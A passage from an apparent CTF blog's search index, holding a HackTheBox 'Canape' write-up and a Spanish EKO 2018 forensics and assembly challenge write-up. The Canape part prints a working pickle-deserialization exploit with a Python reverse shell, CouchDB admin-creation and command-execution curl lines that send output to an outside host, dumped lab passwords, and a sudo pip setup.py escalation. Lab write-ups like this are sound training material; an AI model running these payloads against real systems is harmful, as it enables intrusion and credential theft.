+ quote)[:10]\n                p_id = md5(char + quote).hexdigest()\n                outfile = open( /tmp/  + p_id +  .p ,  wb )\n        outfile.write(char + quote)\n        outfile.close()\n            success = True\n        except Exception as ex:\n            error = True\n\n    if error:\n        return  html p1 error /p1 /html \n    else:\n        return  html p1 success /p1 /html \n    #return  render_template( submit.html , error=error, success=success)\n\n@app.route( /check , methods=[ POST ])\ndef check():\n    print request.form[ id ]\n    path =  /tmp/  + request.form[ id ] +  .p \n    data = open(path,  rb ).read()\n\n    if  p1  in data:\n        item = cPickle.loads(data)\n    else:\n        item = data\n    print item\n    return  Still reviewing:   + item\n\nif __name__ ==  __main__ :\n    app.run(host= 0.0.0.0 )  (it may be a little modified, but the core parts are there.)\nSo with this version running locally, I continued developing my exploit to get a reverse shell, and after a couple of minutes, I achieved this:   import requests\n#import base64\nfrom hashlib import md5\n\nPATH_REMOTE =  http://10.10.10.70/{} \nPATH_LOCAL =  http://192.168.0.15:5000/{} \nREMOTE = True\n\ndef submit_exploit(cmd):\n    action = 'submit'\n    char =  S'homer'\\np1\\ncos\\nsystem\\n(S'{cmd}'\\ntRS'marge'\\np1\\n .format(cmd=cmd)\n    quote = '.'\n    payload =  character={char} quote={quote} .format(char=char,quote=quote)\n    headers = {'Content-type': 'application/x-www-form-urlencoded'}\n    path = PATH_REMOTE.format(action) if REMOTE else PATH_LOCAL.format(action)\n    print payload\n    r = requests.post(path, data=payload, headers=headers)\n    if r.status_code == 200 and ( thank you for your suggestion  in r.text.lower() or 'success' in r.text.lower()): \n        print  [+] Payload successfully sent. Command: {cmd} .format(cmd=cmd)\n        #return base64.encodestring(char+quote)[:10]\n        return md5(char+quote).hexdigest()\n    else:\n        print  [-] Error sending payload \n        raise Exception( Error sending payload: \\n\\tHttp code returned: {http_code}. \\n\\t response body:\\n {body} .format(http_code= r.status_code, body=r.text))\n\ndef check_and_run_exploit(id_code):\n    action = 'check'\n    headers = {'Content-type': 'application/x-www-form-urlencoded'}\n    payload =  id={id_code} .format(id_code=id_code)\n    path = PATH_REMOTE.format(action) if REMOTE else PATH_LOCAL.format(action)\n    r = requests.post(path, data=payload, headers=headers)\n    if r.status_code == 200: \n        print  [+] Exploit successfully executed \n        return r.text\n    else:\n        print  [-] Error executing exploit \n        raise Exception( Error executing exploit: \\n\\tHttp code returned: {http_code}. \\n\\t response body:\\n {body} .format(http_code= r.status_code, body=r.text))\n\nif __name__ ==  __main__ :\n    cmd =  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\ 10.10.14.255\\ ,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\ /bin/sh\\ ,\\ -i\\ ]);' \n    id_code = submit_exploit(cmd)\n    check_and_run_exploit(id_code)  Two disclaimers:   The first and last part of the payload have two strings Homer and Marge. The first one is to bypass the whitelist filtering that app has regarding the name of the character. The last one is to avoid the application to trigger and error when concatenating the result of the Pickle.load() to a string (otherwise it will try to concatenate a number (the error code of the executed command) and a string, and it will fail).  The REMOTE variable is just something custom made to quickly switch between the Remote server and my local one.   After launching the exploit, we get a reverse shell in the port 4444. Once we got the reverse shell, we upgraded to tty (see ippsec video) in order to have more features (history, auto-completition, etc).   Although, we have a reverse shell, the user running the HTTP server is  www-data , so we need to escalate privileges and log in as other user. \nOnce inside the machine, my first move was to run  LinEnum.sh . Once of the outputs of it was the following:    I spent hours, trying to understand this file. Until I gave up (hopefully I did it) and continue looking in another place. I guess it was a  BIG  troll.  Analyzing the applications running on the system and its ports, I found the  couchdb  running in localhost. \nI started reading a little bit about this DB (never saw it before), and quickly figure it out how to connect to it:   $  curl -X GET http://localhost:5984\n{ couchdb : Welcome , version : 2.0.0 , vendor :{ name : The Apache Software Foundation }}  I started playing around a little more and figured it out how to list dbs and docs inside them:   $  curl -X GET http://localhost:5984/_all_dbs\n[ _global_changes , _metadata , _replicator , _users , passwords , simpsons ]\n$  curl -X GET http://localhost:5984/simpsons/_all_docs\n{ total_rows :7, offset :0, rows :[\n{ id : f0042ac3dc4951b51f056467a1000dd9 , key : f0042ac3dc4951b51f056467a1000dd9 , value :{ rev : 1-fbdd816a5b0db0f30cf1fc38e1a37329 }},\n{ id : f53679a526a868d44172c83a61000d86 , key : f53679a526a868d44172c83a61000d86 , value :{ rev : 1-7b8ec9e1c3e29b2a826e3d14ea122f6e }},\n{ id : f53679a526a868d44172c83a6100183d , key : f53679a526a868d44172c83a6100183d , value :{ rev : 1-e522ebc6aca87013a89dd4b37b762bd3 }},\n{ id : f53679a526a868d44172c83a61002980 , key : f53679a526a868d44172c83a61002980 , value :{ rev : 1-3bec18e3b8b2c41797ea9d61a01c7cdc }},\n{ id : f53679a526a868d44172c83a61003068 , key : f53679a526a868d44172c83a61003068 , value :{ rev : 1-3d2f7da6bd52442e4598f25cc2e84540 }},\n{ id : f53679a526a868d44172c83a61003a2a , key : f53679a526a868d44172c83a61003a2a , value :{ rev : 1-4446bfc0826ed3d81c9115e450844fb4 }},\n{ id : f53679a526a868d44172c83a6100451b , key : f53679a526a868d44172c83a6100451b , value :{ rev : 1-3f6141f3aba11da1d65ff0c13fe6fd39 }}\n$  curl -X GET http://localhost:5984/passwords/_all_docs\n{ error : unauthorized , reason : You are not a server admin. }  So the job now seems to be getting server admin. After a google search looking for vulnerabilties affecting this DB in this version, I found this  EXCELENT   blogpost . Basically the attack consist in creating a server admin without any credentials only by sending an HTTP request (for further details, read the blog).  I changed (just the names) a little bit the PoC of the blog and executed against the db:   $  curl -X PUT 'http://localhost:5984/_users/org.couchdb.user:oops' --data-binary '{\n   type :  user ,\n   name :  tsuller ,\n   roles : [ _admin ],\n   roles : [],\n   password :  tsuller \n}'\n{ ok :true, id : org.couchdb.user:tsuller , rev : 1-0b547bb36cb610ec21d9571312f6e20c }  Yes! Seems that it worked! Lets check:  $  curl -X GET http://tsuller:tsuller@localhost:5984/_passwords/_all_docs\n{ total_rows :4, offset :0, rows :[\n{ id : 739c5ebdf3f7a001bebb8fc4380019e4 , key : 739c5ebdf3f7a001bebb8fc4380019e4 , value :{ rev : 2-81cf17b971d9229c54be92eeee723296 }},\n{ id : 739c5ebdf3f7a001bebb8fc43800368d , key : 739c5ebdf3f7a001bebb8fc43800368d , value :{ rev : 2-43f8db6aa3b51643c9a0e21cacd92c6e }},\n{ id : 739c5ebdf3f7a001bebb8fc438003e5f , key : 739c5ebdf3f7a001bebb8fc438003e5f , value :{ rev : 1-77cd0af093b96943ecb42c2e5358fe61 }},\n{ id : 739c5ebdf3f7a001bebb8fc438004738 , key : 739c5ebdf3f7a001bebb8fc438004738 , value :{ rev : 1-49a20010e64044ee7571b8c1b902cf8c }}\n]}  YES! Worked. Lets dump the content of each doc:  $  curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4\n{ _id : 739c5ebdf3f7a001bebb8fc4380019e4 , _rev : 2-81cf17b971d9229c54be92eeee723296 , item : ssh , password : 0B4jyA0xtytZi7esBNGp , user : }\n$  curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc43800368d\n{ _id : 739c5ebdf3f7a001bebb8fc43800368d , _rev : 2-43f8db6aa3b51643c9a0e21cacd92c6e , item : couchdb , password : r3lax0Nth3C0UCH , user : couchy }\n$  curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438003e5f\n{ _id : 739c5ebdf3f7a001bebb8fc438003e5f , _rev : 1-77cd0af093b96943ecb42c2e5358fe61 , item : simpsonsfanclub.com , password : h02ddjdj2k2k2 , user : homer }\n$  curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438004738\n{ _id : 739c5ebdf3f7a001bebb8fc438004738 , _rev : 1-49a20010e64044ee7571b8c1b902cf8c , user : homerj0121 , item : github , password : STOP STORING YOUR PASSWORDS HERE -Admin }  If we pay atenttion to the  home  directory, we'll just find  homer  user. So my next step was to try to login with this user using some of this credentials. Fortunately, the first one (the  ssh  one) worked, and seconds later I was able to get the user flag:", 
            "title": "User"
        }, 
        {
            "location": "/ctfs/hackthebox/canape/#root", 
            "text": "To start, I ran again the  LinEnum.sh  but this time tried to pay a little more of attention to the output, but... it was worthless. Nothing point me to the right direction.  In some moment, I thought that the couchdb was running as  root . I decided to look for some public exploit. Fortunately, I found one that allowed you to execute commands if you were a system admin. Not only we had the user created by us, but also  couchy  (look the docs of the  password  db) was admin. \nThanks to this  blogpost  first, and a little help from  this  also I was able to successfully execute commands:   curl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/_config/query_servers/cmd' -d ' whoami | curl http://10.10.14.255:5555 -d @- '  --insecure\ncurl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing' --insecure\ncurl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing/blah' -d '{ _id : 770855a97726d5666d70a22173005c77 }' --insecure\ncurl -X POST 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing/_temp_view?limit=11' -d '{ language : cmd , map : }' -H 'Content-Type: application/json' --insecure  Unfortunately, when I went to my shell where I was hosting the NC in port 5555, the news were bad. The answer of the  whoami  wasn't root but homer. I must have confused with some other running process.   I continued looking for some interesting thing, but nothing showed up.   During that search, I issued:   sudo -l   And this was the output:\n![sudoers][./images/canape/sudoers.png]  For those not very familiar, this means that the user  homer  can run as  root  the command  pip install  without providing a password (this comes from the configuration of the /etc/sudoers file). How can we abuse this?  PIP  is a python packet manager. It allows not only to write down the package you want (and if it's in the pipy repository download it) but also it allows you to install packages providing the source file directly. Usually, python packages have a very particular file called  setup.py  which is the one in charge of really installing the package in your enviroment (virtual env or general env).   So my idea was to, download a compressed version of package that already exists (I pick  request  because is my favourite lib), modify it's code, compress it again and try to install it using sudo:   Downloaded the source code from  here .  Decompressed it.  Added the following line to the setup.py:   os.system('cat /root/root.txt   /tmp/4877df3bb9dfe713a404dd8d6e4e94cc.p')  (I used that name just to try not to spoil to anybody the flag due to in /tmp there are all the submitted quotes)  Compressed it again.  Served it in a python serve so you can copy it to the machine .\n* Executed:  sudo /usr/bin/pip install blablabla.tar.gz   Read the flag from  /tmp/4877df3bb9dfe713a404dd8d6e4e94cc.p  Modify again the previous setup.py again, this time to delete the flag file and don't spoil to anyone =D.", 
            "title": "Root"
        }, 
        {
            "location": "/ctfs/own/eko2017/kidnapped/", 
            "text": "PlaceHolder", 
            "title": "Kidnapped"
        }, 
        {
            "location": "/ctfs/own/eko2017/kidnapped/#placeholder", 
            "text": "", 
            "title": "PlaceHolder"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/", 
            "text": "Kidnapped\n\n\n\n\nCategory: Miscellaneous\n\n\nPoints: 500/500\n\n\n\n\nEnunciado\n\n\nParece un chiste.. \nEl a\u00f1o pasado me hicieron lo mismo. Me queda tiempo hasta el 28 de septiembre para entregar un trabajo de la misma materia (que recurs\u00e9 ya que nadie pudo ayudarme el a\u00f1o pasado) \"Programaci\u00f3n en assembler\". Ya estoy empezando a sospechar que alguno de ustedes me quiere hacer pasar muchos malos momentos. \n\n\nEn fin.. me pas\u00f3 algo muy parecido al a\u00f1o pasado. Hab\u00eda terminado con el trabajo, estaba por hacer un backup, cuando de repente.. mi pc se volvi\u00f3 loca. Aparecieron archivos, archivos mios se borraron, ahora hay archivos con extensiones \".enc\" ... no entiendo nada. \n\n\nPor favor, dame una mano con esto. Necesito de una vez por todas terminar esta materia. El que me hizo esto, me dej\u00f3 una nota.. Capaz eso les ayuda? \nLes dejo un pedazo (fijense que pesa solo 15 MB, osea no trabajen sobre esa imagen porque se van a quedar sin lugar) de mi disco. Espero que les sirva de algo. \nGracias\n\n\nFile\n\n\ndisk img\n\n\nParte 1: Desencriptando files\n\n\nEl challenge simplemente provee una imagen de un disco. \nPor lo tanto, montemos esta imagen: \n\n\nsudo mount -o rw file.img /mnt/challenge\n\n\n\n\nEjecutemos un \nls -R\n para ver que files interesantes tenemos:\n\n\n\n\nParece ser un home directory de alguna distribuci\u00f3n de Linux. Adem\u00e1s, de las carpetas por defecto, parece ser que s\u00f3lo 3 files son interesantes:\n\n\n\n\nplay_for_the_key.enc\n\n\ntarea_secuestrada.asm.zip.enc\n\n\nnota\n\n\n\n\nLa nota, dice:\n\n\nNo es f\u00e1cil terminar esta materia... te habr\u00e1s dado cuenta.. pensaste que como ya te hab\u00eda pasado el a\u00f1o pasado este a\u00f1o no te iba a volver a pasar? jaj, pobre.\n\nConsejo de amigos... aprend\u00e9 un poco m\u00e1s a proteger tu pc... \n\nEl a\u00f1o pasado te ayud\u00e9 bastante.. este a\u00f1o.. estas solito.. solo un consejo te voy a dar si queres volver a obtener tu tarea: \n\n                        \nHay veces, que romper es mucho m\u00e1s dificil que aprender a jugar\n.\n\nEspero que sepas darte cuenta cuando haya que aplicar este principio.\n\nMucha suerte..\nAh, casi me olvidaba, te volv\u00ed a modificar un poco tu tarea asique.. vas a tener que arreglarla otra vez.. \nSaludos\n\n\n\n\nLo \u00fanico interesante ac\u00e1 parece ser la frase: \n\"Hay veces, que romper es mucho m\u00e1s dificil que aprender a jugar\"\n.\n\n\nIgulamente por ahora, no parece ser \u00fatil. \n\n\nUsando el comando \nls\n, no vamos a listar los archivos ocultos. Si usamos el flag \n\"-a\"\n  vamos a encontrar en el home, un file bastante interesante, el \nbash_history\n con el siguiente contenido:\n\n\nwhoami\ncd Desktop/\nls\ncat /etc/passwd\nsudo su - \ncd /home/\nsu - eldiegomaradona\nsu - elcharliedelapeople\ncrontab -e \ncd /home/alumno/\ncd facu/\ncd programacion_assembler/\ncd tarea_final/\nvim play_for_key.c\nmovcc play_for_key -o play_for_key\nvim simd.asm\nzip -er tarea_secuestrada.asm.zip simd.asm\nrm -rf simd.asm play_for_key.c\nopenssl enc -aes-256-cbc -in tarea_secuestrada.asm.zip -out tarea_secuestrada.asm.zip.enc\nopenssl enc -aes-256-cbc -in play_for_key -out play_for_key.enc\nrm -rf play_for_key\nrm -rf tarea_secuestrada.asm.zip\nvim nota\ncd ~\nrm .bash*\nlogout\n\n\n\n\nPor lo que vemos, el atacante:\n\n\n\n\nTrat\u00f3 de loguearse con algunos usuarios.\n\n\nAbri\u00f3 el file de configuraci\u00f3n de los crons, habr\u00e1 modificado algo? (no tenemos nada para confirmarlo).\n\n\nCre\u00f3/edit\u00f3 un file llamado play_for_key.c (\nvim play_for_the_key.c\n).\n\n\nLo compilo? Con algo raro? (\nmovcc play_for_key -o play_for_key\n).\n\n\nCre\u00f3/edit\u00f3 un file llamado simd.asm, ser\u00e1 la tarea? (\nvim simd.asm\n) .\n\n\nZipea el file con password, y ac\u00e1 podemos confirmar que es la tarea (\nzip -er tarea_secuestrada.asm.zip simd.asm\n).\n\n\nElimina los files con c\u00f3digo fuente (\nrm -rf simd.asm play_for_key.c\n).\n\n\nEncripta ambos files, sin proporcionar password! (\nambas lineas de openssl\n)\n\n\nElimina dicho files, es decir, s\u00f3lo deja los encriptados (\nambas lineas de rm\n)\n\n\nElimina todo los files que comiencen con .bash (\nrm .bash\n)\n\n\n\n\nSi tratamos de desencriptar los files de extensi\u00f3n .enc, no vamos a poder ya que nos pide una password. Dado que en los comandos para encriptar los files no se utiliz\u00f3 el flag \n\"-k\"\n, para especificar la password en el comando propiamente, entonces podemos asumir que la password fue ingresada en modo interactivo, y por lo tanto no va a haber registro de ella.\n\n\nUna de las posibilidades ac\u00e1 seria tratar de bruteforcear la password... Pero en general, al menos desde mi punto de vista, yo har\u00eda esto cuando se me acaban las opciones. \n\n\nEn este caso, podemos ver que se borraron varios archivos. Por lo tanto, podr\u00edamos usar alguna suite de forensia con el objetivo de recuperar los files eliminados, como por ejemplo, \nphotorec\n. \n\n\nCon photorec, se puede recuperar al menos un archivo. Ese archivo, parece ser el \n.bashrc\n del usuario, y entre sus l\u00edneas, tiene lo siguiente:\n\n\n# enable some nice features\nopenssl(){\n    ba=$4\n    /usr/bin/openssl $1 $2 $3 $4 $5 $6 -k $(for i in {1..100}; do echo -n ${#ba}; done)\n}\n\n\n\n\nEsto quiere decir que, basicamente, el atacante cre\u00f3 un alias con el mismo nombre que el comando \nopenssl\n, redefiniendo su acci\u00f3n. En resumen, lo que esta haciendo eso, es agregar la password de encripci\u00f3n con el flag \n\"-k\"\n cada vez que se llama al comando \nopenssl\n. Dicha password es la longitud del nombre del file pasado por par\u00e1metro, repetido 100 veces. La longitud del string \nplay_for_the_key\n es 16 y de \ntarea_secuestrada.asm.zip\n es 25. Por lo tanto, los siguientes comandos, vamos a poder desencriptar ambos files:\n\n\n/usr/bin/openssl enc -d -aes-256-cbc -in tarea_secuestrada.asm.zip.enc -out tarea_secuestrada.asm.zip -k 25252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525\n\n/usr/bin/openssl enc -d -aes-256-cbc -in play_for_the_key.enc -out play_for_the_key -k 16161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616\n\n\n\n\nTener que la salida de estos comandos deber\u00eda ser almacenada afuera del disco, ya que s\u00f3lo tiene 15 MB\n\n\nParte 2: Jugar, a veces es m\u00e1s facil\n\n\nEn este momento tenemos 2 files imporatantes:\n\n \nplay_for_the_key\n: Un binario de 32 bits. Que cuando lo ejecutamos parece que nos pide respuestas a unas \"preguntas\". \n\n \ntarea_secuestrada.zip\n: Un archivo ZIP con password. \n\n\nEn este momento uno podr\u00eda tratar de bruteforcear la password del ZIP quiz\u00e1s usando JTR o Hashcat o cualquier otra tool para crackear password de un ZIP. Pero, dado que existe un binario con un nombre bastante claro, se puede intuir que el camino al menos l\u00f3gico, ser\u00eda tratar de conseguir la key usando dicho binario. \n\n\nPlay for the key\n\n\nCuando ejecutamos el binario, el siguiente mensaje aparece:\n\n\nIngresa la respuesta n\u00famero 1:\n\n\n\n\nA esta altura no tenemos ni idea que significa esto. Si empezamos a probar y fallamos, el mensaje \n\"Nop!\"\n se imprimir\u00e1 en la pantalla. En cambio, si ponemos la respuesta correcta, nos pedir\u00e1 la respuesta a la siguiente pregunta:\n\n\n\n\nPero \u00bfC\u00f3mo sabemos cuantas pregunta son? \u00bfCu\u00e1l es la repuesta correcta? \n\n\nUna opci\u00f3n v\u00e1lida en este momento ser\u00eda tratar de reversear el binario y ver qu\u00e9 est\u00e1 haciendo. Para este ejemplo, voy a usar \nBinary Ninja\n. Sin embargo, cuando vamos a ver el graph view del binario, vemos algo bastante extra\u00f1o.. Solo existe un basic block. Si seguimos mirando, vamos a notar que s\u00f3lo hay instrucciones \nMOV\n:\n\n\n\n\n\u00bfQu\u00e9 est\u00e1 pasando?. Si volvemos atr\u00e1s un poco y revisamos otra vez el \nbash_history\n vamos a darnos cuenta que este binario fue compilado usando un comando llamado \nmovcc\n. El primer resultado de la b\u00fasqueda de dicho comando en Google, nos lleva a un github de una tool llamada \nmovfuscator\n. Seg\u00fan su documentaci\u00f3n, esta compila un c\u00f3digo fuente en un binario de s\u00f3lo instrucciones \nMOV\n. Si bien desde un punto de performance y hasta de espacio que ocupa dicho binario, es bastante malo, al estar escrito s\u00f3lo con instrucciones \nMOV\n el reversing de este binario se vuelve muchisimo m\u00e1s tedioso. \n\n\nY aqu\u00ed se abren dos caminos:\n1. Encontramos una tool para de-movfuscar el binario.\n2. Hacemos uso del msj de la nota, y JUGAMOS en vez de tratar de romper el juego. \n\n\nVamos a ir por la opci\u00f3n 2: \n\n\nLuego de probar un poco con algunos valores que ingresamos como respuestas, vamos a notar que:\n1. Para 1, la respuesta es 1.\n2. Para 2, la respuesta es 2. \n3. Para 3, la respuesta es 1. \n4. Para 4, la respuesta es 1.\n5. Para 5, la respuesta es 2.\n6. Para 6, la respuesta es 1. \n7. Para 7, la respuesta es 2.\n8. Para 8, la respuesta es 1. \n9. Para 9, la respuesta es 2.\n10. Para 10, la respuesta es 3. \n11. Para 11, la respuesta es 4.\n12. Para 12, la respuesta es 1.\n\n\nSi observamos con detalle, podemos ver que el la respuesta es un numero que empieza a aumentar pero en ciertos valores vuelve a uno. Dichos valores son: 2, 3, 5, 7, 11, etc.\n\n\nEs decir, parece ser un contador que cuando el n\u00famero de la pregunta es uno de esos, el contador se resetea y vuelve a empezar de 1.\n\n\nPero \u00bfQu\u00e9 tienen de com\u00fan estos n\u00fameros? \nSON PRIMOS!!\n\n\nTodav\u00eda no sabemos qu\u00e9 cantidad de preguntas hay, pero igualmente, podemos hacer un script que imprima un contador y que cada vez que se cruza con un n\u00famero primo, vuelva a 1. Dado que no sabemos la cantidad, podemos ir probando hasta que la encontremos. Yo arranqu\u00e9 con 15, y faltaban mas. Mi siguiente paso fue probar con 1000, y funcion\u00f3. La cantidad de preguntas finalmente eran 100. \n\n\nSolucionador\n\n\nprimos = []\ncontador = 1\nnumero_de_pregunta = 1\nposible_numero_de_preguntas = 1000\nfor numero_de_pregunta in xrange(1,posible_numero_de_preguntas):\n        print contador\n        if any((numero_de_pregunta % primo) == 0 for primo in primos) or numero_de_pregunta == 1:\n                contador += 1\n        else:\n                contador = 1\n                primos.append(numero_de_pregunta)\n\n\n\n\nIntento con 15 primos\n\n\n\n\nIntento con 1000 primos\n\n\n\n\nSi intentamos descomprimir el ZIP con esa clave, vamos a obtener un \u00faltimo file \nsimd.asm\n, que es la \u00faltima parte del challenge. \n\n\nParte 3: Programaci\u00f3n en assembler\n\n\nLa \u00faltima parte del challenge implica tratar de entender qu\u00e9 hizo el atacante (qu\u00e9 modific\u00f3) para poder volver hacer que funcione otra vez. \n\n\nEl file original contiene:\n\n\n nasm -f elf64 simd.asm; ld -o simd simd.o\nsection     .text\nglobal      _start                              \n\n_start:                                         \n\n    movdqu  xmm1, [Parallel_processing]\n    movdqu  xmm3, [is_much_faster...You_know?]\n    movdqu  xmm5, [but_sometimes_is_difficult]\n    movdqu  xmm7, [to_understand_how_it_works.]\n    movdqu  xmm10, [Anyways_I_trust_you...]\n\n    movdqu  xmm2, xmm1\n    movdqu  xmm4, xmm3\n    movdqu  xmm6, xmm5\n    movdqu  xmm8, xmm7\n    movdqu  xmm11, xmm10\n\n    pxor xmm9, xmm9\n\n    punpckhwd xmm1, xmm9   \n    punpckhwd xmm2, xmm9   \n    punpcklwd xmm3, xmm9   \n    punpckhwd xmm4, xmm9   \n    punpcklwd xmm5, xmm9   \n    punpcklwd xmm6, xmm9   \n    punpcklwd xmm7, xmm9   \n    punpckhwd xmm8, xmm9\n    punpcklwd xmm10, xmm9\n    punpckhwd xmm9 ,xmm11\n\n\n    psubw xmm1, xmm10\n    psubw xmm2, xmm11\n    psubw xmm3, xmm10\n    psubw xmm4, xmm11\n    psubw xmm5, xmm10\n    psubw xmm6, xmm11\n    psubw xmm7, xmm10\n    psubw xmm8, xmm11\n\n    packuswb xmm1, xmm2 \n    packuswb xmm3, xmm4 \n    packuswb xmm5, xmm6 \n    packuswb xmm7, xmm8 \n\n\n    movdqu [Parallel_processing], xmm1\n    movdqu [is_much_faster...You_know?], xmm3\n    movdqu [but_sometimes_is_difficult], xmm5\n    movdqu [to_understand_how_it_works.], xmm7\n\n    mov     ecx, Parallel_processing  \n    mov     edx, 0x40\n    mov     ebx,1                               \n    mov     eax,4                               \n    int     0x80                                \n\n    mov     eax,1                               \n    int     0x80                                \n\n\nsection     .data\nParallel_processing dq 0x7e7618131b332312, 0xb5db2d5e4333690e\nis_much_faster...You_know? dq 0x487bdfe02d301eee, 0x9db0232038f9321e\nbut_sometimes_is_difficult dq 0x4a47dbdf5e07f2f5, 0x6caaef1f3ef1312f\nto_understand_how_it_works. dq 0x5078dd0e61071ff0, 0x5a9adf0f28e0206b\nAnyways_I_trust_you... dq 0x1715ABADFACEBABE\nWhats_wrong_in_this_code? dq 0x3A7ABEEF08C0FFEE \n\n\n\n\nLo m\u00e1s imporante ac\u00e1 es entender qu\u00e9 est\u00e1 haciendo este c\u00f3digo, al menos una idea a alto nivel para despu\u00e9s ahondar en cada detalle. \nDividamos el c\u00f3digo en partes:\n\n\nAn\u00e1lisis de c\u00f3digo - Parte 1\n\n\n\n    movdqu  xmm1, [Parallel_processing]\n    movdqu  xmm3, [is_much_faster...You_know?]\n    movdqu  xmm5, [but_sometimes_is_difficult]\n    movdqu  xmm7, [to_understand_how_it_works.]\n    movdqu  xmm10, [Anyways_I_trust_you...]\n\n    movdqu  xmm2, xmm1\n    movdqu  xmm4, xmm3\n    movdqu  xmm6, xmm5\n    movdqu  xmm8, xmm7\n    movdqu  xmm11, xmm10\n\n    pxor xmm9, xmm9\n\n\n\n\nEn esta parte, simplemente est\u00e1 copiando el contenido de las etiquetas a los registros XMM (16 bytes). Luego, hace una de cada una de ellos, dejando el mismo contenido de a pares. Es decir, \nxmm1\n tiene el mismo valor que \nxmm2\n, \nxmm3\n el mismo que \nxmm4\n, etc.. Por \u00faltimo, \nxmm9\n lo pone en 0. \n\n\nAn\u00e1lisis de c\u00f3digo - Parte 2\n\n\npunpckhwd xmm1, xmm9   \npunpckhwd xmm2, xmm9   \npunpcklwd xmm3, xmm9   \npunpckhwd xmm4, xmm9   \npunpcklwd xmm5, xmm9   \npunpcklwd xmm6, xmm9   \npunpcklwd xmm7, xmm9   \npunpckhwd xmm8, xmm9\npunpcklwd xmm10, xmm9\npunpckhwd xmm9 ,xmm11\n\n\n\n\nEn esta segunda parte, se puede observar dos instrucciones distintas:\n\n \npunpckhwd\n\n\n \npunpcklwd\n\n\n\u00c9stas, son parte de un conjunto de instrucciones (SSE) usados para procesamiento paralelo. \nGoogleando un poco, se puede encontrar que la funci\u00f3n \npunpckhwd\n divide los registros, tanto fuente como destino, en words (2 bytes) (por eso la ante \u00faltima letra, \nw\n). Toma las words que est\u00e1n en la parte high (por eso la letra \nh\n antes de la \nw\n) de ambos registros, y los intercala. \n\n\nLo imporante de esta parte, no es tanto entrar en detalle de c\u00f3mo es que se intercalan estrictamente, sino m\u00e1s que nada entender que: \n\n\n\n\nSe est\u00e1 unpackeando words\n\n\nSe est\u00e1 unpackeando o bien la parte high, o bien la parte low.\n\n\nCasi\n todas ellas se est\u00e1n unpackeando con 0 (\nxmm9\n es 0).\n\n\n\n\nSi recordamos lo que se hizo en la primera parte, hab\u00eda pares de registros \nxmm\n que tenian el mismo valor. Si bien vemos casos en la parte 2, donde se est\u00e1 unpackeando la parte high y low de un mismo valor de registros (por ejemplo, para \nxmm3\n y \nxmm4\n), tambi\u00e9n vemos casos donde se hace dos veces la parte high (\nxmm1\n y \nxmm2\n). Raro..\n\n\nAdem\u00e1s, vemos que la \u00faltima intrucci\u00f3n, parece unpackear al rev\u00e9s, es decir, usando el \nxmm9\n como registro fuente y no como destino. Otra cosa para anotar.\n\n\nAn\u00e1lisis de c\u00f3digo - Parte 3\n\n\npsubw xmm1, xmm10\npsubw xmm2, xmm11\npsubw xmm3, xmm10\npsubw xmm4, xmm11\npsubw xmm5, xmm10\npsubw xmm6, xmm11\npsubw xmm7, xmm10\npsubw xmm8, xmm11\n\n\n\n\nOtra instrucci\u00f3n del mismo set de procesamiento paralelo. En este caso esta instrucci\u00f3n hace una resta word a word de cada registro y almacena el resultado en el registro destino. \n\n\nObsevado este pedazo de c\u00f3digo, se puede intuir que ni \nxmm11\n ni \nxmm10\n son usados dos veces con el mismo par de registros. Es decir, todo par de registros usa una vez \nxmm10\n y una vez \nxmm11\n. \nDe hecho, por el orden y lo n\u00fameros de regitros, podr\u00edamos llegar a pensar que \nxmm10\n es siempre usado para la parte \nlow\n de los pares de registros y \nxmm11\n para la parte \nhigh\n.\n\n\nAn\u00e1lisis de c\u00f3digo - Parte 4\n\n\npackuswb xmm1, xmm2 \npackuswb xmm3, xmm4 \npackuswb xmm5, xmm6 \npackuswb xmm7, xmm8 \n\n\n\n\nPor \u00faltimo, en esta parte, se hace el packeo otra vez para volver a la \"normalidad\". Cada par de registros, se packean juntos. \nSin embargo, dicho packeo, se hace de word a byte (por eso \nwb\n a lo \u00faltimo) cuando el unpackeo se hizo de word a double word... raro.. \n\n\nAn\u00e1lisis de c\u00f3digo - Parte 5\n\n\nmovdqu [Parallel_processing], xmm1\nmovdqu [is_much_faster...You_know?], xmm3\nmovdqu [but_sometimes_is_difficult], xmm5\nmovdqu [to_understand_how_it_works.], xmm7\n\n\n\n\nSe escribe dichas posiciones de memoria el valor que tienen algunos (los representantes de cada par?) de los \nxmm\n despu\u00e9s de hacer las operaciones. \n\n\nAn\u00e1lisis de c\u00f3digo - Parte 6\n\n\nmov     ecx, Parallel_processing  \nmov     edx, 0x40\nmov     ebx,1                               \nmov     eax,4                               \nint     0x80                                \n\nmov     eax,1                               \nint     0x80                                \n\n\n\n\nFinalmente, imprime por pantalla los 64 bytes que tenga la posici\u00f3n de memoria apuntada por la etiqueta \nParallel_processing\n. \n\n\nAn\u00e1lisis de c\u00f3digo - Resumen\n\n\nHay al menos 3 cosas que parecen raras: \n\n\n\n\nEn el momemto de unpackear, hay algunos pares de registros que se unpackea la misma parte (high o low). \n\n\nEn una instrucci\u00f3n de unpackeo, se usa el \nxmm9\n como registro destino (no consistente con todo lo anterior).\n\n\nEn el momento de packear, si bien se hab\u00eda unpackeado de word a double word, se packea de word a byte.\n\n\n\n\nAl ser un ejercicio de \"patching\", no queda otra que ir probando los cambios a ver como afectan. Igualmente, as\u00ed como fuimos intuyendo a lo largo del texto, podr\u00edamos hacer los cambios para l\u00f3gicos:\n\n\n\n\nCada par deberia unpackear la parte low y la parte high. C\u00f3mo saber cual deber\u00eda, podr\u00edamos probar. Sin embargo, por c\u00f3mo est\u00e1 escrito el c\u00f3digo, vamos a optar por 